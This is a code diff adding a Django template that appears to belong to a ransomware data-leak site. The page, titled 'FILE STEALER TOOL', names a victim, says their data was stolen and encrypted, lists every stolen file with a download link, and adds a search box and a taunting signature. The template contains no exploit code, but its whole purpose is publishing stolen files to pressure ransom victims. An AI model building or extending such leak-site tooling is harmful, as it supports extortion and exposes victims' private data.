@@ -1,0 +1,53 @@
+{% extends 'web/base.html' %}  
+{% load static %}              
+
+{% block content %}
+
+<link rel="stylesheet" href="{%static 'web/ransomvictimpage.css' %}">
+
+{% if ransom_users.Published == True %}
+<div class="main-content-container">
+    <h1>FILE STEALER TOOL</h1>
+        <p>This data comes from {{ransom_users.UserName}} and was stolen and encrypted on {{ransom_users.CreationDate}}. Below is a tool that will allow you to search and filter for any files you are interested in. <br> No system is totally secure ~AINS</p>
+    <div class="top-container-mains">
+    <p>Total Files : {{ransom_users.Files.all.count }}</p>
+    <input type="text" id="search-input" placeholder="Search a file..." onkeyup="filterFiles()">
+    </div>
+    <div class="files-content-container">
+        {% for ransom_user in ransom_users.Files.all %}
+            <div class="file">
+                <img src="{% static 'web/images/folder.png' %}">
+                <a href="/{{ransom_users.id}}/{{ransom_user.FileName}}/downloadfile/"><p>{{ransom_user.FileName}}</p></a>
+            </div>
+        {% endfor %}
+    </div>
+</div>
+
+<script>
+        function filterFiles() {
+            // Obtener el texto del campo de búsqueda y convertir a minúsculas para una comparación sin distinción de mayúsculas
+            const searchValue = document.getElementById('search-input').value.toLowerCase();
+
+            // Obtener todos los elementos div con clase "file"
+            const fileDivs = document.querySelectorAll('.file');
+
+            // Iterar sobre cada div para determinar si debe mostrarse o ocultarse
+            fileDivs.forEach(div => {
+                // Obtener el contenido del párrafo dentro del enlace y convertir a minúsculas para comparación
+                const paragraphText = div.querySelector('a p').textContent.toLowerCase();
+
+                // Mostrar u ocultar según la coincidencia del texto
+                if (paragraphText.includes(searchValue)) {
+                    div.classList.remove('hidden'); // Mostrar si coincide
+                } else {
+                    div.classList.add('hidden'); // Ocultar si no coincide
+                }
+            });
+        }
+
+</script>
+{% else %}
+{% endif %}
+
+{% endblock %}
+
